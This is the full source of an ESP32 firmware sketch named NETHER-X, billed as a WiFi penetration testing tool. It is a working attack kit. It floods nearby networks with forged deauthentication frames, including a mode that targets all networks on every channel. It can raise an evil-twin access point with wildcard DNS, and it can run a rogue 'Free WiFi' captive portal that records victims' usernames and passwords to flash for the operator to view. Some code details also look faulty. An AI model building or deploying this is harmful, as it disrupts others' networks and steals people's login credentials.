#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <esp_wifi.h>

Preferences prefs;
WebServer server(80);
DNSServer dns;

const char* ap_ssid = "GMpro";
const char* ap_pass = "Sangkur87";
const IPAddress apIP(8, 8, 8, 8);

bool attackOn = false;
bool evilTwinOn = false;
bool rogueOn = false;

struct Target {
  String ssid;
  String bssid;
  int ch;
  int rssi;
};

Target targets[30];
int targetCount = 0;

void startAP() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ap_ssid, ap_pass);
  Serial.println("AP Started: " + String(ap_ssid));
}

void scanNetworks() {
  int n = WiFi.scanNetworks();
  targetCount = 0;
  for (int i = 0; i < n && targetCount < 30; i++) {
    targets[targetCount].ssid = WiFi.SSID(i);
    targets[targetCount].bssid = WiFi.BSSIDstr(i);
    targets[targetCount].ch = WiFi.channel(i);
    targets[targetCount].rssi = WiFi.RSSI(i);
    targetCount++;
  }
  WiFi.scanDelete();
  Serial.println("Found " + String(targetCount) + " networks");
}

void deauthTask(void* param) {
  attackOn = true;
  Serial.println("Deauth started");
  
  while (attackOn) {
    for (int ch = 1; ch <= 13; ch++) {
      if (!attackOn) break;
      
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      int n = WiFi.scanNetworks();
      
      for (int i = 0; i < n; i++) {
        if (!attackOn) break;
        if (WiFi.channel(i) == ch) {
          uint8_t bssid[6];
          String bssidStr = WiFi.BSSIDstr(i);
          sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                 &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
          
          uint8_t pkt[26] = {
            0xC0, 0x00, 0x3A, 0x01,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00
          };
          memcpy(&pkt[4], bssid, 6);
          memcpy(&pkt[16], bssid, 6);
          
          for (int j = 0; j < 15; j++) {
            if (!attackOn) break;
            esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
            delayMicroseconds(100);
          }
        }
      }
      WiFi.scanDelete();
      delay(5);
    }
  }
  
  Serial.println("Deauth stopped");
  vTaskDelete(NULL);
}

void handleRoot() {
  String html = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>NETHER-X</title><style>";
  html += "* { margin: 0; padding: 0; box-sizing: border-box; } ";
  html += "body { font-family: Arial, sans-serif; background: #0a0a1a; color: #fff; min-height: 100vh; } ";
  html += ".header { background: linear-gradient(135deg, #0066ff, #003399); padding: 25px; text-align: center; } ";
  html += ".header h1 { font-size: 2.5em; color: #00ffff; margin-bottom: 5px; text-shadow: 0 0 20px rgba(0,255,255,0.8); } ";
  html += ".header p { color: #00ffff; font-size: 1.1em; } ";
  html += ".container { max-width: 1200px; margin: 0 auto; padding: 20px; } ";
  html += ".grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; } ";
  html += ".card { background: #1a1a3a; border-radius: 15px; padding: 20px; border: 2px solid #0066ff; box-shadow: 0 0 20px rgba(0,100,255,0.3); } ";
  html += ".card h2 { color: #00ffff; border-bottom: 2px solid #0066ff; padding-bottom: 10px; margin-bottom: 15px; } ";
  html += ".status { display: inline-block; padding: 8px 20px; border-radius: 25px; font-weight: bold; } ";
  html += ".on { background: #00ff00; color: #000; } ";
  html += ".off { background: #ff0000; color: #fff; } ";
  html += "button { background: linear-gradient(135deg, #0066ff, #003399); color: #fff; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 1em; margin: 5px; } ";
  html += "button:hover { transform: scale(1.05); box-shadow: 0 0 15px rgba(0,200,255,0.5); } ";
  html += ".btn-start { background: linear-gradient(135deg, #00ff00, #00cc00); } ";
  html += ".btn-stop { background: linear-gradient(135deg, #ff0000, #cc0000); } ";
  html += ".btn-danger { background: linear-gradient(135deg, #ff8800, #cc6600); } ";
  html += "input, select { width: 100%; padding: 12px; margin: 8px 0; background: #0a0a2a; border: 2px solid #0066ff; color: #fff; border-radius: 8px; font-size: 1em; } ";
  html += "table { width: 100%; border-collapse: collapse; margin-top: 10px; } ";
  html += "th { background: #0066ff; color: #fff; padding: 12px; text-align: left; } ";
  html += "td { padding: 10px; border-bottom: 1px solid #333; } ";
  html += ".log { background: #000; border: 2px solid #00ff00; border-radius: 8px; padding: 15px; font-family: monospace; max-height: 250px; overflow-y: auto; white-space: pre-wrap; color: #00ff00; } ";
  html += ".footer { text-align: center; padding: 20px; color: #666; font-size: 0.9em; margin-top: 30px; border-top: 1px solid #333; } ";
  html += "</style></head><body>";
  
  html += "<div class='header'><h1>NETHER-X</h1><p>WiFi Penetration Testing Tool - ESP32</p></div>";
  html += "<div class='container'><div class='grid'>";
  
  html += "<div class='card'><h2>Status</h2>";
  html += "<p>SSID: <strong>" + String(ap_ssid) + "</strong></p>";
  html += "<p>Password: <strong>" + String(ap_pass) + "</strong></p>";
  html += "<p>IP: <strong>8.8.8.8</strong></p>";
  html += "<p>Mode: <span class='status " + String(attackOn ? "on" : "off") + "'>" + String(attackOn ? "ATTACKING" : "IDLE") + "</span></p>";
  html += "<p>Evil Twin: <span class='status " + String(evilTwinOn ? "on" : "off") + "'>" + String(evilTwinOn ? "ACTIVE" : "OFF") + "</span></p>";
  html += "<p>Networks: <strong id='netCount'>" + String(targetCount) + "</strong></p>";
  html += "</div>";
  
  html += "<div class='card'><h2>WiFi Scanner</h2><button onclick='scan()'>Scan Networks</button><div id='networks'></div></div>";
  
  html += "<div class='card'><h2>Deauth Attack</h2><button class='btn-start' onclick='startDeauth()'>Start Deauth All</button><button class='btn-stop' onclick='stopDeauth()'>Stop</button></div>";
  
  html += "<div class='card'><h2>Evil Twin</h2><input type='text' id='etSSID' placeholder='Target SSID'><input type='number' id='etCH' placeholder='Channel' value='1'><button onclick='startET()'>Start Evil Twin</button><button class='btn-danger' onclick='stopET()'>Stop</button></div>";
  
  html += "<div class='card'><h2>Rogue AP</h2><input type='text' id='rogueSSID' value='Free_WiFi' placeholder='Fake SSID'><button onclick='startRogue()'>Start Rogue AP</button><button class='btn-danger' onclick='stopRogue()'>Stop</button></div>";
  
  html += "<div class='card'><h2>Captured Credentials</h2><button onclick='loadLogs()'>Refresh Logs</button><div id='logs' class='log'>No credentials captured yet</div></div>";
  
  html += "<div class='card'><h2>Settings</h2><input type='text' id='newSSID' value='GMpro'><input type='text' id='newPASS' value='Sangkur87'><button onclick='saveSettings()'>Save and Reboot</button><button class='btn-danger' onclick='resetAll()'>Factory Reset</button></div>";
  
  html += "</div><div class='footer'>NETHER-X v1.0 | ESP32 Edition | GMpro Network</div></div>";
  
  html += "<script>";
  html += "let targets=[];";
  html += "function scan(){fetch('/scan').then(r=>r.json()).then(d=>{targets=d;document.getElementById('netCount').textContent=d.length;let t='<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>CH</th><th>ENC</th><th>Action</th></tr>';";
  html += "d.forEach((n,i)=>{t+='<tr><td>'+i+'</td><td>'+(n.ssid||'Hidden')+'</td><td>'+n.rssi+' dBm</td><td>'+n.ch+'</td><td>'+(n.enc?'Locked':'Open')+'</td><td><button onclick=deauth('+i+')>Deauth</button></td></tr>';});";
  html += "t+='</table>';document.getElementById('networks').innerHTML=t;});}";
  html += "function deauth(i){fetch('/deauth?i='+i);}";
  html += "function startDeauth(){fetch('/deauthstart');}";
  html += "function stopDeauth(){fetch('/deauthstop').then(()=>location.reload());}";
  html += "function startET(){fetch('/etstart?ssid='+encodeURIComponent(document.getElementById('etSSID').value)+'&ch='+document.getElementById('etCH').value);}";
  html += "function stopET(){fetch('/etstop');}";
  html += "function startRogue(){fetch('/rstart?ssid='+encodeURIComponent(document.getElementById('rogueSSID').value));}";
  html += "function stopRogue(){fetch('/rstop');}";
  html += "function loadLogs(){fetch('/logs').then(r=>r.text()).then(d=>document.getElementById('logs').textContent=d||'No data');}";
  html += "function saveSettings(){fetch('/save?ssid='+encodeURIComponent(document.getElementById('newSSID').value)+'&pass='+encodeURIComponent(document.getElementById('newPASS').value)).then(()=>alert('Saved! Rebooting...'));}";
  html += "function resetAll(){if(confirm('Factory reset?'))fetch('/reset');}";
  html += "setInterval(scan,15000);scan();";
  html += "</script></body></html>";
  
  server.send(200, "text/html", html);
}

void handleScan() {
  scanNetworks();
  String json = "[";
  for (int i = 0; i < targetCount; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + targets[i].ssid + "\",";
    json += "\"bssid\":\"" + targets[i].bssid + "\",";
    json += "\"rssi\":" + String(targets[i].rssi) + ",";
    json += "\"ch\":" + String(targets[i].ch) + ",";
    json += "\"enc\":" + String(targets[i].ssid.length() > 0 ? 1 : 0) + ",";
    json += "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleDeauthStart() {
  if (!attackOn) {
    xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 0);
  }
  server.send(200, "text/plain", "OK");
}

void handleDeauthStop() {
  attackOn = false;
  server.send(200, "text/plain", "OK");
}

void handleDeauth() {
  int idx = server.arg("i").toInt();
  if (idx >= 0 && idx < targetCount) {
    uint8_t bssid[6];
    String bssidStr = targets[idx].bssid;
    sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
    
    uint8_t pkt[26] = {
      0xC0, 0x00, 0x3A, 0x01,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x01, 0x00
    };
    memcpy(&pkt[4], bssid, 6);
    memcpy(&pkt[16], bssid, 6);
    
    for (int i = 0; i < 50; i++) {
      esp_wifi_set_channel(targets[idx].ch, WIFI_SECOND_CHAN_NONE);
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
      delayMicroseconds(100);
    }
    Serial.println("Deauth sent to: " + targets[idx].ssid);
  }
  server.send(200, "text/plain", "OK");
}

void handleETStart() {
  String ssid = server.arg("ssid");
  if (ssid.length() > 0) {
    evilTwinOn = true;
    WiFi.softAPdisconnect(true);
    dns.stop();
    delay(200);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str());
    dns.setErrorReplyCode(DNSReplyCode::NoError);
    dns.start(53, "*", apIP);
    Serial.println("Evil Twin: " + ssid);
  }
  server.send(200, "text/plain", "OK");
}

void handleETStop() {
  evilTwinOn = false;
  dns.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  startAP();
  server.send(200, "text/plain", "OK");
}

void handleRogueStart() {
  String ssid = server.arg("ssid");
  if (ssid.length() > 0) {
    rogueOn = true;
    WiFi.softAPdisconnect(true);
    dns.stop();
    delay(200);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str());
    dns.setErrorReplyCode(DNSReplyCode::NoError);
    dns.start(53, "*", apIP);
    
    server.on("/login", HTTP_POST, [&]() {
      String user = server.arg("user");
      String pass = server.arg("pass");
      prefs.begin("netherx", true);
      String log = prefs.getString("log", "");
      log += "SSID:" + ssid + " | User:" + user + " | Pass:" + pass + "\n";
      prefs.putString("log", log);
      prefs.end();
      Serial.println("CAPTURED -> User:" + user + " Pass:" + pass);
      server.send(200, "text/html", "<html><body style='background:#0a0a1a;color:#fff;text-align:center;padding:50px'><h1 style='color:#0f0'>Login Successful!</h1><p>You are now connected.</p></body></html>");
    });
    
    server.onNotFound([]() {
      String html = "<html><body style='background:#0a0a1a;color:#fff;text-align:center;padding:50px'>";
      html += "<h1>Free WiFi Login</h1>";
      html += "<form action='/login' method='post' style='max-width:300px;margin:30px auto'>";
      html += "<input name='user' placeholder='Username' style='width:100%;padding:12px;margin:8px 0;border-radius:8px'>";
      html += "<input type='password' name='pass' placeholder='Password' style='width:100%;padding:12px;margin:8px 0;border-radius:8px'>";
      html += "<button style='width:100%;padding:15px;background:#00ff00;color:#000;border:none;border-radius:8px;font-size:1.1em;cursor:pointer'>Connect</button>";
      html += "</form></body></html>";
      server.send(200, "text/html", html);
    });
    
    Serial.println("Rogue AP: " + ssid);
  }
  server.send(200, "text/plain", "OK");
}

void handleRogueStop() {
  rogueOn = false;
  dns.stop();
  server.onNotFound([]() {});
  WiFi.softAPdisconnect(true);
  delay(100);
  startAP();
  server.send(200, "text/plain", "OK");
}

void handleLogs() {
  prefs.begin("netherx", false);
  String log = prefs.getString("log", "No credentials captured");
  prefs.end();
  server.send(200, "text/plain", log);
}

void handleSave() {
  String ssid = server.arg("ssid");
  String pass = server.arg("pass");
  if (ssid.length() > 0) {
    prefs.begin("netherx", true);
    prefs.putString("ssid", ssid);
    prefs.putString("pass", pass);
    prefs.end();
    ESP.restart();
  }
  server.send(200, "text/plain", "OK");
}

void handleReset() {
  prefs.begin("netherx", true);
  prefs.clear();
  prefs.end();
  ESP.restart();
}

void handleCaptive() {
  server.sendHeader("Location", "http://8.8.8.8/");
  server.send(302);
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  prefs.begin("netherx", false);
  String savedSSID = prefs.getString("ssid", "");
  String savedPASS = prefs.getString("pass", "");
  if (savedSSID.length() > 0) ap_ssid = savedSSID.c_str();
  if (savedPASS.length() >= 8) ap_pass = savedPASS.c_str();
  prefs.end();
  
  Serial.println("=================================");
  Serial.println("NETHER-X v1.0 - ESP32 Edition");
  Serial.println("SSID: " + String(ap_ssid));
  Serial.println("PASS: " + String(ap_pass));
  Serial.println("=================================");
  
  startAP();
  dns.setErrorReplyCode(DNSReplyCode::NoError);
  dns.start(53, "*", apIP);
  
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauthstart", handleDeauthStart);
  server.on("/deauthstop", handleDeauthStop);
  server.on("/deauth", handleDeauth);
  server.on("/etstart", handleETStart);
  server.on("/etstop", handleETStop);
  server.on("/rstart", handleRogueStart);
  server.on("/rstop", handleRogueStop);
  server.on("/logs", handleLogs);
  server.on("/save", handleSave);
  server.on("/reset", handleReset);
  server.on("/generate_204", handleCaptive);
  server.begin();
  
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
}

void loop() {
  dns.processNextRequest();
  server.handleClient();
  
  if (attackOn) {
    digitalWrite(LED_BUILTIN, millis() % 200 < 100 ? HIGH : LOW);
  } else {
    digitalWrite(LED_BUILTIN, evilTwinOn || rogueOn ? HIGH : LOW);
  }
}